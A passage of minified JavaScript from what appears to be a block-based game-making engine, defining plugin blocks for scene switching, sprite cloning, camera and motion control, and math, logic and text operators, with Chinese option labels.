    sgbp: "B8Sev4UTza.rBfidGjOoT",
    pssd: "Physical.setStaticOrDynamicPhysics",
    psld: "Physical.setLinearDamping",
    psad: "Physical.setAngularDamping",
    ssc: "B8Sev4UTza.LhCMOYH1nN",
    ssi: "B8Sev4UTza.fwhrKviVlo",
    isbc: "B8Sev4UTza.JfwC1Dp3bG"
}, OUTLINE_OPCODE = ["Solid", "Platform", "Jumpthrough"], _class$j = function (t) {
    function e(t) {
        return classCallCheck(this, e), (t = possibleConstructorReturn(this, (e.__proto__ || Object.getPrototypeOf(e)).call(this, t)))._blockEngine = t._runtime._blockEngine,
            t.renderer = t._runtime.renderer, t;
    }
    return inherits(e, t), createClass(e, [{
        key: "setDragMode",
        value: function (t, e) {
            var i = this;
            this.getBatchList(t).forEach(function (t) {
                (t = i.renderer.getSpriteById(t)) && (t.dragMode = e);
            });
        }
    }, {
        key: "toggleSpriteEvent",
        value: function (t, e) {
            var i = this;
            this.getBatchList(t).forEach(function (t) {
                (t = i.renderer.getSpriteById(t)) && t.toggleEvent("1" === e);
            });
        }
    }, {
        key: "gotoScene",
        value: function (t) {
            var e, i = Object.keys(this._runtime.config.scenes);
            if ("number" == typeof t && (t = i[t - 1]), this._runtime.runtimeData.current_scene_id !== t) {
                if (this._blockEngine.stopAllThread(), !i.includes(t)) throw this._runtime._blockEngine.stopAllThread(),
                    e = (i = this.currentThread.target).id, i = i.name, new LB.ErrorHelper.CallBlockException(e, i, "目标场景不存在");
                this._runtime.runtimeData.gotoScene(t);
            }
        }
    }, {
        key: "nextScene",
        value: function () {
            var t, e = this, i = Object.keys(this._runtime.config.scenes), n = i.findIndex(function (t) {
                return t === e._runtime.runtimeData.current_scene_id;
            }), n = i[n + 1];
            if (this._blockEngine.stopAllThread(), !i.includes(n)) throw this._runtime._blockEngine.stopAllThread(),
                t = (i = this.currentThread.target).id, i = i.name, new LB.ErrorHelper.CallBlockException(t, i, "目标场景不存在");
            this._runtime.runtimeData.gotoScene(n);
        }
    }, {
        key: "releaseScene",
        value: function (t) {
            var e, i;
            if (!Object.keys(this._runtime.config.scenes).includes(t)) throw this._runtime._blockEngine.stopAllThread(),
                e = (i = this.currentThread.target).id, i = i.name, new LB.ErrorHelper.CallBlockException(e, i, "目标场景不存在");
            this._runtime.runtimeData.releaseScene(t);
        }
    }, {
        key: "releaseSceneByIndex",
        value: function (t) {
            var e, i, n, s = void 0;
            for (e in this._runtime.config.scenes) if (this._runtime.config.scenes[e].zIndex === +t) {
                s = e;
                break;
            }
            if (!s) throw this._runtime._blockEngine.stopAllThread(), i = (n = this.currentThread.target).id,
                n = n.name, new LB.ErrorHelper.CallBlockException(i, n, "目标场景不存在");
            this._runtime.runtimeData.releaseScene(e);
        }
    }, {
        key: "restartCurrent",
        value: function () {
            this.restart(!0);
        }
    }, {
        key: "restart",
        value: function (t) {
            var e = (i = this.currentThread).blocks, i = i.entry;
            e.getCache(i).opcode !== OPCODE.eventGameStart && ((e = this._runtime.getPluginManager()._behaviorsByCtor.get(LB.Behaviors.Physical)) && e.clear(),
                this.currentThread.stop(), this._runtime.reset(t), this._runtime.isMiniGame) && wx.triggerGC();
        }
    }, {
        key: "clone",
        value: function (t) {
            var e = this.currentThread, i = (r = e.target).isOriginal, n = r.mother, s = r.id, r = r.name;
            if (i = "_self_" === t ? i ? e.target : this._runtime.runtimeData.getSpriteById(n) : (i = (n = this._runtime.runtimeData.components)[t] ? n[t].layers[0] : t,
                this._runtime.runtimeData.getSpriteById(i))) return Performance.startPointToList("makeClone"),
                    n = 1 <= e.stackFrames.filter(function (t) {
                        return !0 === t.isLogicLoop;
                    }).length, t = this._runtime.runtimeData.makeClone(i, s, n), Performance.endPointToList("makeClone"),
                    this._spriteOverloadProtect(), t;
            throw new LB.ErrorHelper.CallBlockException(s, r, "克隆对象不存在");
        }
    }, {
        key: "_spriteOverloadProtect",
        value: function () {
            var t = (e = (e = this._runtime.runtimeData).scenes[e.current_scene_id]).sprites, e = e.layers;
            if (1e3 < t.length) for (var i = e.length; i < t.length && !this.deleteClone(null, {
                target: t[i]
            }); i++);
        }
    }, {
        key: "deleteClone",
        value: function () {
            var t = this.currentThread.target, e = t.id;
            if (t.isOriginal) return !1;
            this._runtime.runtimeData.deleteClone(this.currentThread.target);
            for (var i = this._blockEngine.threads, n = i.length, s = 0; s < n; s++) i[s].target.id === e && i[s].stop();
            return !0;
        }
    }, {
        key: "release",
        value: function () {
            get(e.prototype.__proto__ || Object.getPrototypeOf(e.prototype), "release", this).call(this);
        }
    }, {
        key: "getBatchList",
        value: function (t, e) {
            return (t = this._runtime.runtimeData.checkAndgetSpriteId({
                str: t,
                type: e,
                thread: this.currentThread
            })) ? LB.Util.isArray(t) ? t : [t] : [];
        }
    }, {
        key: "joinCollision",
        value: function (t, e) {
            var i = this;
            this.getBatchList(t).forEach(function (t) {
                (t = i.renderer.getSpriteById(t)) && (t.noCollision = "false" === e);
            });
        }
    }, {
        key: "stop",
        value: function (t) {
            "all" === t ? this._blockEngine.stopAllThread() : "other scripts in sprite" === t || "other scripts in stage" === t ? this._blockEngine.stopOtherTargetThreads(this.currentThread) : "this script" === t && this.currentThread.stop();
        }
    }, {
        key: "setMsg",
        value: function (t, e) {
            if ("_self_" == t ? t = this.currentThread.target.id : this.currentThread.scope[t] ? t = this.currentThread.scope[t] : LB.Util.White.includes(t) || (t = this._runtime.runtimeData.getCloneListById(t, this.currentThread)),
                !1 === t) return !1;
            this.eventEmitter.emit(OPCODE.eventReceivedMsg, {
                OPTION_LIST: e
            }, t, null, null);
        }
    }, {
        key: "follow",
        value: function (t) {
            var e = "_self_" == t ? this.currentThread.target.id : t, t = this.renderer.getSpriteById(e);
            this.renderer.camera.follow(t);
        }
    }, {
        key: "setCameraZone",
        value: function (t) {
            t = this._runtime.runtimeData.checkAndgetSpriteId({
                str: t,
                thread: this.currentThread
            }), t = this.renderer.getSpriteById(t), LB.Camera.setCameraZone(this.renderer.camera, t);
        }
    }, {
        key: "setOutOrInCameraZone",
        value: function (t, e) {
            var t = this._runtime.runtimeData.checkAndgetSpriteId({
                str: t,
                thread: this.currentThread
            }), t = this.renderer.getSpriteById(t), i = this._runtime.runtimeData.currentScene.renderer;
            LB.Camera.setOutOrInCameraZone(i, t, "_in_" === e);
        }
    }, {
        key: "cameraScaleTo",
        value: function (t) {
            this.renderer.camera.setZoom(LB.Util.toNumber(t), !0);
        }
    }, {
        key: "cameraScaleBy",
        value: function (t, e) {
            var i = this.renderer.camera, n = LB.Util.toNumber(i.scale.x);
            "-" === t ? n -= LB.Util.toNumber(e) : n += LB.Util.toNumber(e), n = Math.round(100 * n) / 100,
                i.setZoom(n, !0);
        }
    }, {
        key: "cameraMoveTo",
        value: function (t, e) {
            var i = this.renderer.camera, n = i.center;
            "x" === t ? i._x = -LB.Util.toNumber(e) : i._y = LB.Util.toNumber(e), i.moveCenter(n);
        }
    }, {
        key: "cameraMoveBy",
        value: function (t, e, i) {
            var n = this.renderer.camera, s = n.center;
            "x" === t ? n._x -= ("-" === e ? -1 : 1) * LB.Util.toNumber(i) : n._y += ("-" === e ? -1 : 1) * LB.Util.toNumber(i),
                n.moveCenter(s);
        }
    }, {
        key: "currentThread",
        get: function () {
            return this._blockEngine.currentThread;
        }
    }, {
        key: "blockEngine",
        get: function () {
            return this._blockEngine;
        }
    }]), e;
}(LB.SDK.IPluginInstanceBase), Action$a = {
    QYEgN5CLl3: {
        args: [{
            type: "list",
            name: "OPTION_LIST1",
            options: LB.BlockHelper.getSpritesListWithSelf,
            isTarget: !0
        }, {
            type: "list",
            name: "OPTION_LIST",
            options: [["任意方向", "_any_"], ["横向", "_horizontal_"], ["纵向", "_vertical_"], ["不可", "none"]]
        }],
        fun: function () {
            this.setDragMode.apply(this, arguments);
        }
    },
    A4uWBnhcxX: {
        args: [{
            type: "list",
            name: "OPTION_LIST1",
            options: LB.BlockHelper.getSpritesListWithSelf,
            isTarget: !0
        }, {
            type: "list",
            name: "OPTION_LIST",
            options: [["不响应", "2"], ["响应", "1"]]
        }],
        fun: function () {
            this.toggleSpriteEvent.apply(this, arguments);
        }
    },
    hQgym4nVos: {
        args: [{
            type: "list",
            name: "TARGET",
            options: LB.BlockHelper.getSpriteALLList
        }, {
            type: "list",
            name: "OPTION_LIST",
            options: LB.BlockHelper.getMessageList
        }],
        fun: function (t, e) {
            this.setMsg(t, e);
        }
    },
    GJNTf4loXv: {
        args: [{
            type: "list",
            name: "OPTION_LIST",
            options: LB.BlockHelper.getLayerListWithSelf
        }],
        fun: function (t) {
            this.clone(t);
        }
    },
    FCrF434uxA: {
        fun: function () {
            this.deleteClone();
        }
    },
    DgAY9ldq7Z: {
        visible: !1,
        args: [{
            type: "list",
            name: "OPTION_LIST",
            options: LB.BlockHelper.getLayerListWithSelf
        }],
        fun: function () {
            this.deleteClone();
        }
    },
    tg38vVbCCZ: {
        args: [{
            type: "list",
            name: "OPTION_LIST",
            options: LB.BlockHelper.getSceneList
        }],
        shape: "shape_end",
        fun: function (t) {
            this.gotoScene(t);
        }
    },
    TMJYe4hpyi: {
        shape: "shape_end",
        fun: function () {
            this.nextScene();
        }
    },
    asWO4P9mKs: {
        args: [{
            type: "input",
            name: "INDEX",
            input: "w_number",
            default: 1
        }],
        shape: "shape_end",
        fun: function (t) {
            this.gotoScene(Number(t));
        }
    },
    o8GvSx9Pxk: {
        args: [{
            type: "list",
            name: "OPTION_LIST",
            options: LB.BlockHelper.getSceneList
        }],
        fun: function (t) {
            this.releaseScene(t);
        }
    },
    Dv4gylzukt: {
        args: [{
            type: "input",
            name: "INDEX",
            input: "w_number",
            default: 1
        }],
        fun: function (t) {
            this.releaseSceneByIndex(t);
        }
    },
    nqa1Hc77fc: {
        args: [{
            type: "list",
            name: "OPTION_LIST",
            options: [["当前精灵的其他事件", "other scripts in sprite"], ["当前事件", "this script"], ["全部事件", "all"]]
        }],
        fun: function (t) {
            this.stop(t);
        }
    },
    ZzUSGqW9h3: {
        shape: "shape_end",
        fun: function () {
            this.restart();
        }
    },
    L3uGGcnGjC: {
        shape: "shape_end",
        fun: function () {
            this.restartCurrent();
        }
    },
    xSBRCUekbH: {
        args: [{
            type: "list",
            name: "OPTION_LIST1",
            options: LB.BlockHelper.getSpritesListWithSelf,
            isTarget: !0
        }, {
            type: "list",
            name: "OPTION_LIST",
            options: [["不参与", "false"], ["参与", "true"]]
        }],
        fun: function () {
            this.joinCollision.apply(this, arguments);
        }
    },
    ffA99kPUml: {
        args: [{
            type: "list",
            name: "OPTION_LIST",
            options: LB.BlockHelper.getLayerListWithSelf
        }],
        fun: function () {
            this.setCameraZone.apply(this, arguments);
        }
    },
    iJMASrUITy: {
        args: [{
            type: "list",
            name: "OPTION_LIST",
            options: LB.BlockHelper.getLayerListWithSelf
        }, {
            type: "list",
            name: "OPTION_LIST1",
            options: [["移出", "_out_"], ["移入", "_in_"]]
        }],
        fun: function () {
            this.setOutOrInCameraZone.apply(this, arguments);
        }
    },
    syRTXLMSvF: {
        args: [{
            type: "list",
            name: "OPTION_LIST",
            options: LB.BlockHelper.getLayerListWithSelf
        }],
        fun: function () {
            this.follow.apply(this, arguments);
        }
    },
    TB2aatDBRr: {
        args: [{
            type: "input",
            name: "SIZE",
            input: "p_number",
            default: 1.5
        }],
        fun: function () {
            this.cameraScaleTo.apply(this, arguments);
        }
    },
    b9jsapM95s: {
        args: [{
            type: "list",
            name: "OPERATE",
            options: [["增加", "+"], ["减少", "-"]]
        }, {
            type: "input",
            name: "SIZE",
            input: "number",
            default: .1
        }],
        fun: function () {
            this.cameraScaleBy.apply(this, arguments);
        }
    },
    RjlDDtX9pw: {
        args: [{
            type: "list",
            name: "OPTION_LIST",
            options: [["X", "x"], ["Y", "y"]]
        }, {
            type: "input",
            name: "XY",
            input: "number",
            default: 0
        }],
        fun: function () {
            this.cameraMoveTo.apply(this, arguments);
        }
    },
    QpevBIrPX8: {
        args: [{
            type: "list",
            name: "OPTION_LIST",
            options: [["X", "x"], ["Y", "y"]]
        }, {
            type: "list",
            name: "OPERATE",
            options: [["增加", "+"], ["减少", "-"]]
        }, {
            type: "input",
            name: "XY",
            input: "number",
            default: 0
        }],
        fun: function () {
            this.cameraMoveBy.apply(this, arguments);
        }
    },
    QOcko4u16A: {
        fun: function () {
            return this._runtime.runtimeData.clock.resetProjectTimer();
        }
    }
}, Condition$9 = {}, Expression$9 = {
    BrTUHbzRUF: {
        fun: function () {
            return this._runtime.runtimeData.clock.projectTimer();
        }
    }
}, _class$i = function (t) {
    function e(t) {
        return classCallCheck(this, e), possibleConstructorReturn(this, (e.__proto__ || Object.getPrototypeOf(e)).call(this, t));
    }
    return inherits(e, t), createClass(e, [{
        key: "release",
        value: function () {
            get(e.prototype.__proto__ || Object.getPrototypeOf(e.prototype), "release", this).call(this);
        }
    }]), e;
}(LB.SDK.IPluginBase), _class$h = (_class$i.Instance = _class$j, _class$i.Action = Action$a,
    _class$i.Condition = Condition$9, _class$i.Expression = Expression$9, function (t) {
        function e(t) {
            return classCallCheck(this, e), (t = possibleConstructorReturn(this, (e.__proto__ || Object.getPrototypeOf(e)).call(this, t)))._blockEngine = t._runtime._blockEngine,
                t.renderer = t._runtime.renderer, t.startTicking(), t;
        }
        return inherits(e, t), createClass(e, [{
            key: "getBatchList",
            value: function (t, e) {
                return (t = this._runtime.runtimeData.checkAndgetSpriteId({
                    str: t,
                    type: e,
                    thread: this.currentThread
                })) ? LB.Util.isArray(t) ? t : [t] : [];
            }
        }, {
            key: "moveSteps",
            value: function (t, e) {
                var i = this;
                e = LB.Util.toNumber(e) * this._runtime.devicePixel, this.getBatchList(t).forEach(function (t) {
                    (t = i.renderer.getSpriteById(t)) && t.goForward(e);
                });
            }
        }, {
            key: "release",
            value: function () { }
        }, {
            key: "tick",
            value: function () { }
        }, {
            key: "bounceOf",
            value: function (t) {
                var e = this, t = t.OPTION_LIST, i = this.currentThread.target.renderer;
                "_edge_" === t || "_left_edge_" === t || "_right_edge_" === t || "_top_edge_" === t || "_bottom_edge_" === t ? i.bounceOfEdge(t) : (t = "string" == typeof (t = this._runtime.runtimeData.checkAndgetSpriteId({
                    str: t,
                    thread: this.currentThread
                })) ? [t] : t).forEach(function (t) {
                    t = e.renderer.getSpriteById(t), i.bounceOfSprite(t);
                });
            }
        }, {
            key: "changeXY",
            value: function (t, e) {
                var i = this, n = 2 < arguments.length && void 0 !== arguments[2] ? arguments[2] : "+", s = LB.Util.toNumber(arguments[3]) * this._runtime.devicePixel, s = "-" === n ? -s : s;
                this.getBatchList(t).forEach(function (t) {
                    (t = i._runtime.runtimeData.getSpriteById(t)) && (t = t.renderer, "x" === e ? t.setPosition(t.getX() + s, null) : t.setPosition(null, t.getY() + s));
                });
            }
        }, {
            key: "setXY",
            value: function (t, e, i) {
                var n = this, s = LB.Util.toNumber(i) * this._runtime.devicePixel;
                this.getBatchList(t).forEach(function (t) {
                    (t = n._runtime.runtimeData.getSpriteById(t)) && ("x" === e ? t.renderer.setPosition(s, null) : t.renderer.setPosition(null, s));
                });
            }
        }, {
            key: "turn",
            value: function (t, e) {
                var i = this;
                this.getBatchList(t).forEach(function (t) {
                    (t = i.renderer.getSpriteById(t)) && t.rotate(LB.Util.toNumber(e));
                });
            }
        }, {
            key: "rotateTo",
            value: function (t, e) {
                var i = this;
                this.getBatchList(t).forEach(function (t) {
                    (t = i.renderer.getSpriteById(t)) && t.rotateTo(e);
                });
            }
        }, {
            key: "goTo",
            value: function (t, e, i) {
                var n = this;
                if (!e) return !1;
                e = this._runtime.runtimeData.checkAndgetSpriteId({
                    str: e,
                    thread: this.currentThread
                }), LB.Util.isArray(e) && (e = e[0]);
                var s = this._getTargetXY(e, i);
                void 0 === s || Number.isNaN(s[0]) || Number.isNaN(s[1]) || (s[0] = s[0] * this._runtime.devicePixel,
                    s[1] = s[1] * this._runtime.devicePixel, this.getBatchList(t).forEach(function (t) {
                        n.renderer.getSpriteById(t).goTo(s[0], s[1]);
                    }));
            }
        }, {
            key: "gotoXY",
            value: function (t, e, i) {
                var n = this;
                e = LB.Util.toNumber(e) * this._runtime.devicePixel, i = LB.Util.toNumber(i) * this._runtime.devicePixel,
                    this.getBatchList(t).forEach(function (t) {
                        n._runtime.runtimeData.getSpriteById(t).renderer.goTo(e, i);
                    });
            }
        }, {
            key: "_getTargetXY",
            value: function (t, e) {
                var i, n, s = 0;
                return "_finger_" === t ? (i = (n = this._runtime.inputManager).mouseX, n = n.mouseY,
                    [i / this._runtime.devicePixel, n / this._runtime.devicePixel]) : (n = "_random_" === t ? (i = this.renderer.gameWidth,
                        n = this.renderer.gameHeight, s = Math.round(i * (Math.random() - .5)), Math.round(n * (Math.random() - .5))) : (i = this.renderer.getSpriteById(t),
                            "2" == e ? (s = i.getX(1), i.getY(1)) : (s = i.getX(), i.getY())), [s / this._runtime.devicePixel, n / this._runtime.devicePixel]);
            }
        }, {
            key: "flip",
            value: function (t) {
                var t = t.OPTION_LIST, e = this.currentThread.target.renderer;
                "top_bottom" === t ? e.scale.y *= -1 : "left_right" === t && (e.scale.x *= -1);
            }
        }, {
            key: "getDegrees",
            value: function (t, e) {
                var i = 0, n = 0, s = t.gPostion;
                switch (e) {
                    case "_finger_":
                        var r = (a = this._runtime.inputManager).mouse_x, a = a.mouse_y;
                        isFinite(r) && isFinite(a) && (i = r - s.x, n = a - -s.y);
                        break;

                    case "_random_":
                        return ~~(360 * Math.random());

                    default:
                        i = (r = this.renderer.getSpriteById(e).gPostion).x - s.x, n = -r.y - -s.y;
                }
                return (0 !== i || 0 !== n) && 180 * LB.Util.positionToRotation(i, n) / Math.PI;
            }
        }, {
            key: "towardsTarget",
            value: function (t, e) {
                var i = this, n = this._runtime.runtimeData.checkAndgetSpriteId({
                    str: e,
                    thread: this.currentThread
                });
                if (!n) return !1;
                LB.Util.isArray(n) && (n = n[0]), this.getBatchList(t).forEach(function (t) {
                    var t = i.renderer.getSpriteById(t), e = i.getDegrees(t, n);
                    "number" == typeof e && t.towardsTo(e);
                });
            }
        }, {
            key: "towardsDegree",
            value: function (t, e) {
                var i = this;
                this.getBatchList(t).forEach(function (t) {
                    (t = i.renderer.getSpriteById(t)) && t.towardsTo(LB.Util.toNumber(-e));
                });
            }
        }, {
            key: "faceToTarget",
            value: function (t, e) {
                var i = this, n = this._runtime.runtimeData.checkAndgetSpriteId({
                    str: e,
                    thread: this.currentThread
                });
                if (!n) return !1;
                LB.Util.isArray(n) && (n = n[0]), this.getBatchList(t).forEach(function (t) {
                    var t = i.renderer.getSpriteById(t), e = i.getDegrees(t, n);
                    "number" == typeof e && t.faceTo(-e);
                });
            }
        }, {
            key: "faceToDegree",
            value: function (t, e) {
                var i = this, t = this.getBatchList(t);
                e = +e, t.forEach(function (t) {
                    t = i.renderer.getSpriteById(t), "number" == typeof e && t.faceTo(e);
                });
            }
        }, {
            key: "currentThread",
            get: function () {
                return this._blockEngine.currentThread;
            }
        }, {
            key: "blockEngine",
            get: function () {
                return this._blockEngine;
            }
        }]), e;
    }(LB.SDK.IPluginInstanceBase)), Action$9 = {
        uqg2ii7ig3: {
            args: [{
                type: "list",
                name: "OPTION_LIST1",
                options: LB.BlockHelper.getSpritesListWithSelf,
                isTarget: !0
            }, {
                type: "input",
                name: "X",
                input: "number",
                default: 0
            }, {
                type: "input",
                name: "Y",
                input: "number",
                default: 0
            }],
            fun: function () {
                this.gotoXY.apply(this, arguments);
            }
        },
        FeUA0Sh825: {
            args: [{
                type: "list",
                name: "OPTION_LIST1",
                options: LB.BlockHelper.getSpritesListWithSelf,
                isTarget: !0
            }, {
                type: "list",
                name: "OPTION_LIST",
                options: [["X", "x"], ["Y", "y"]]
            }, {
                type: "input",
                name: "XY",
                input: "number",
                default: 0
            }],
            fun: function () {
                this.setXY.apply(this, arguments);
            }
        },
        v31p2EoOqo: {
            args: [{
                type: "list",
                name: "OPTION_LIST1",
                options: LB.BlockHelper.getSpritesListWithSelf,
                isTarget: !0
            }, {
                type: "list",
                name: "OPTION_LIST",
                options: [["X", "x"], ["Y", "y"]]
            }, {
                type: "list",
                name: "OPERATE",
                options: [["增加", "+"], ["减少", "-"]]
            }, {
                type: "input",
                name: "DXY",
                input: "number",
                default: 10
            }],
            fun: function () {
                this.changeXY.apply(this, arguments);
            }
        },
        Ihrzh6zqt4: {
            args: [{
                type: "list",
                name: "OPTION_LIST1",
                options: LB.BlockHelper.getSpritesListWithSelf,
                isTarget: !0
            }, {
                type: "input",
                name: "STEPS",
                input: "number",
                default: 100
            }],
            fun: function () {
                this.moveSteps.apply(this, arguments);
            }
        },
        T0Ajfiyxwe: {
            args: [{
                type: "list",
                name: "OPTION_LIST1",
                options: LB.BlockHelper.getSpritesListWithSelf,
                isTarget: !0
            }, {
                type: "input",
                name: "DEGREES",
                input: "angle",
                default: 45
            }],
            fun: function () {
                this.towardsDegree.apply(this, arguments);
            }
        },
        u5ukO3srm6: {
            args: [{
                type: "list",
                name: "OPTION_LIST1",
                options: LB.BlockHelper.getSpritesListWithSelf,
                isTarget: !0
            }, {
                type: "list",
                name: "OPTION_LIST",
                options: LB.BlockHelper.getSpriteListGoto
            }],
            fun: function () {
                this.towardsTarget.apply(this, arguments);
            }
        },
        oWVaeCAJ4W: {
            args: [{
                type: "list",
                name: "OPTION_LIST1",
                options: LB.BlockHelper.getSpritesListWithSelf,
                isTarget: !0
            }, {
                type: "list",
                name: "OPTION_LIST",
                options: LB.BlockHelper.getSpriteListGoto
            }, {
                type: "list",
                name: "OPTION_LIST2",
                options: [["相对坐标", "1"], ["绝对坐标", "2"]]
            }],
            fun: function () {
                this.goTo.apply(this, arguments);
            }
        },
        GNxFyP302o: {
            args: [{
                type: "list",
                name: "OPTION_LIST1",
                options: LB.BlockHelper.getSpritesListWithSelf,
                isTarget: !0
            }, {
                type: "list",
                name: "OPTION_LIST",
                options: LB.BlockHelper.getSpriteListGoto
            }],
            fun: function () {
                this.faceToTarget.apply(this, arguments);
            }
        },
        uVRKdYK1ni: {
            args: [{
                type: "list",
                name: "OPTION_LIST1",
                options: LB.BlockHelper.getSpritesListWithSelf,
                isTarget: !0
            }, {
                type: "input",
                name: "DEGREES",
                input: "angle",
                default: 20
            }],
            fun: function () {
                this.faceToDegree.apply(this, arguments);
            }
        },
        jpkYEG0JK7: {
            args: [{
                type: "list",
                name: "OPTION_LIST1",
                options: LB.BlockHelper.getSpritesListWithSelf,
                isTarget: !0
            }, {
                type: "input",
                name: "DEGREES",
                input: "angle",
                default: 20
            }],
            fun: function () {
                this.rotateTo.apply(this, arguments);
            }
        },
        U4Ej1XIfNf: {
            args: [{
                type: "list",
                name: "OPTION_LIST1",
                options: LB.BlockHelper.getSpritesListWithSelf,
                isTarget: !0
            }, {
                type: "input",
                name: "DEGREES",
                input: "angle",
                default: 45
            }],
            fun: function () {
                this.turn.apply(this, arguments);
            }
        }
    }, Condition$8 = {}, Expression$8 = {}, _class$g = function (t) {
        function e(t) {
            return classCallCheck(this, e), possibleConstructorReturn(this, (e.__proto__ || Object.getPrototypeOf(e)).call(this, t));
        }
        return inherits(e, t), createClass(e, [{
            key: "release",
            value: function () {
                get(e.prototype.__proto__ || Object.getPrototypeOf(e.prototype), "release", this).call(this);
            }
        }]), e;
    }(LB.SDK.IPluginBase), _class$f = (_class$g.Instance = _class$h, _class$g.Action = Action$9,
        _class$g.Condition = Condition$8, _class$g.Expression = Expression$8, function (t) {
            function e(t) {
                return classCallCheck(this, e), (t = possibleConstructorReturn(this, (e.__proto__ || Object.getPrototypeOf(e)).call(this, t)))._blockEngine = t._runtime._blockEngine,
                    t;
            }
            return inherits(e, t), createClass(e, [{
                key: "release",
                value: function () {
                    get(e.prototype.__proto__ || Object.getPrototypeOf(e.prototype), "release", this).call(this);
                }
            }, {
                key: "currentThread",
                get: function () {
                    return this._blockEngine.currentThread;
                }
            }, {
                key: "blockEngine",
                get: function () {
                    return this._blockEngine;
                }
            }]), e;
        }(LB.SDK.IPluginInstanceBase)), Action$8 = {}, Condition$7 = {
            c0MI8PtMXg: {
                args: [{
                    type: "input",
                    name: "OPERAND1",
                    input: "number",
                    default: 0
                }, {
                    type: "list",
                    name: "OPTION_LIST",
                    options: [["<", "lt"], [">", "gt"], ["==", "equals"], ["<=", "lt_equals"], [">=", "gt_equals"], ["!=", "not_equals"]]
                }, {
                    type: "input",
                    name: "OPERAND2",
                    input: "number",
                    default: 1
                }],
                fun: function (t, e, i) {
                    switch (e) {
                        case "lt":
                            return LB.Util.compare(t, i) < 0;

                        case "gt":
                            return 0 < LB.Util.compare(t, i);

                        case "equals":
                            return 0 === LB.Util.compare(t, i);

                        case "lt_equals":
                            return LB.Util.compare(t, i) <= 0;

                        case "gt_equals":
                            return 0 <= LB.Util.compare(t, i);

                        case "not_equals":
                            return 0 !== LB.Util.compare(t, i);
                    }
                }
            },
            dyaEKOk92A: {
                args: [{
                    type: "input",
                    name: "OPERAND1",
                    input: "boolean"
                }, {
                    type: "list",
                    name: "OPTION_LIST",
                    options: [["并且", "and"], ["或者", "or"]]
                }, {
                    type: "input",
                    name: "OPERAND2",
                    input: "boolean"
                }],
                fun: function (t, e, i) {
                    var n = LB.Util.toBoolean(t), s = LB.Util.toBoolean(i);
                    switch (e) {
                        case "and":
                            return n && s;

                        case "or":
                            return n || s;
                    }
                }
            },
            tAfutrobYU: {
                args: [{
                    type: "input",
                    name: "OPERAND",
                    input: "boolean"
                }],
                fun: function (t) {
                    return !LB.Util.toBoolean(t);
                }
            },
            O5mspD0aeu: {
                args: [{
                    type: "input",
                    name: "TEXT1",
                    input: "string",
                    default: "abc"
                }, {
                    type: "input",
                    name: "TEXT2",
                    input: "string",
                    default: "a"
                }],
                fun: function (t, e) {
                    return t.toString().includes(e.toString());
                }
            }
        }, Expression$7 = {
            jnicy19QKr: {
                args: [{
                    type: "input",
                    name: "NUM1",
                    input: "number",
                    default: 0
                }, {
                    type: "list",
                    name: "OPTION_LIST",
                    options: [["+", "add"], ["-", "subtract"], ["*", "multiply"], ["/", "divide"], ["%", "residual"]]
                }, {
                    type: "input",
                    name: "NUM2",
                    input: "number",
                    default: 0
                }],
                fun: function (t, e, i) {
                    var n = LB.Util.toNumber(t), s = LB.Util.toNumber(i), r = void 0;
                    switch (e) {
                        case "add":
                            r = n + s;
                            break;

                        case "subtract":
                            r = n - s;
                            break;

                        case "multiply":
                            r = n * s;
                            break;

                        case "divide":
                            r = n / s;
                            break;

                        case "residual":
                            r = n % s;
                    }
                    return Math.round(1e3 * r) / 1e3;
                }
            },
            f0cdVHGwyA: {
                args: [{
                    type: "input",
                    name: "FROM",
                    input: "number",
                    default: 1
                }, {
                    type: "input",
                    name: "TO",
                    input: "number",
                    default: 10
                }],
                fun: function (t, e) {
                    var i = LB.Util.toNumber(t), n = LB.Util.toNumber(e), s = i <= n ? i : n;
                    return s === (n = i <= n ? n : i) ? s : LB.Util.isInt(t) && LB.Util.isInt(e) ? s + Math.floor(Math.random() * (n + 1 - s)) : Math.random() * (n - s) + s;
                }
            },
            SLbmfGCXEi: {
                args: [{
                    type: "list",
                    name: "OPTION_LIST",
                    options: [["四舍五入", "round"], ["向上取整", "ceil"], ["向下取整", "floor"], ["绝对值", "abs"], ["sqrt", "sqrt"], ["sin", "sin"], ["cos", "cos"], ["tan", "tan"], ["asin", "asin"], ["acos", "acos"], ["atan", "atan"], ["log", "log"]]
                }, {
                    type: "input",
                    name: "NUM",
                    input: "number",
                    default: 0
                }],
                fun: function (t, e) {
                    return "sin" === t || "cos" === t || "tan" === t ? Math.round(1e5 * Math[t](LB.Util.toNumber(e) / 180 * Math.PI)) / 1e5 : "atan" === t || "asin" === t || "acos" === t ? Math[t](LB.Util.toNumber(e)) / Math.PI * 180 : Math[t](LB.Util.toNumber(e));
                }
            },
            X69RB6N73n: {
                args: [{
                    type: "list",
                    name: "OPTION_LIST",
                    options: [["最大值", "max"], ["最小值", "min"]]
                }, {
                    type: "input",
                    name: "NUM1",
                    input: "number",
                    default: 0
                }, {
                    type: "input",
                    name: "NUM2",
                    input: "number",
                    default: 0
                }],
                fun: function (t, e, i) {
                    return "atan2" === t ? Math[t](LB.Util.toNumber(e), LB.Util.toNumber(i)) / Math.PI * 180 : Math[t](LB.Util.toNumber(e), LB.Util.toNumber(i));
                }
            },
            yLSrt4L6GM: {
                fun: function () {
                    return Math.PI;
                }
            },
            II9ayCmjIH: {
                args: [{
                    type: "input",
                    name: "TEXT1",
                    input: "string",
                    default: "文字1"
                }, {
                    type: "input",
                    name: "TEXT2",
                    input: "string",
                    default: "文字2"
                }],
                fun: function (t, e) {
                    return void 0 === e && (e = ""), (t = void 0 === t ? "" : t).toString().concat(e);
                }
            },
            JFoT93WYJF: {
                args: [{
                    type: "input",
                    name: "TEXT1",
                    input: "string",
                    default: "abc"
                }, {
                    type: "input",
                    name: "NUM",
                    input: "w_number",
                    default: 1
                }],
                fun: function (t, e) {
                    return e < 1 || e > t.length || t.length < 1 ? "undefined" : t.toString()[e - 1];
                }
            },
            Twm37e5nEO: {
                args: [{
                    type: "input",
                    name: "TEXT1",
                    input: "string",
                    default: "abc"
                }],
                fun: function (t) {
                    return null != t && t.toString().length || 0;
                }
            },
            OZWI4fObnh: {
                args: [{
                    type: "input",
                    name: "TEXT1",
                    input: "string",
                    default: "abcd"
                }, {
                    type: "input",
                    name: "NUM1",
                    input: "w_number",
                    default: 2
                }, {
                    type: "input",
                    name: "NUM2",
                    input: "w_number",
                    default: 3
                }],
                fun: function (t, e, i) {
                    return t.toString().substring(e - 1, i);
                }
            },
            lJcxlFPzeG: {
                args: [{
                    type: "input",
                    name: "TEXT1",
                    input: "string",
                    default: "b"
                }, {
                    type: "input",
                    name: "TEXT2",
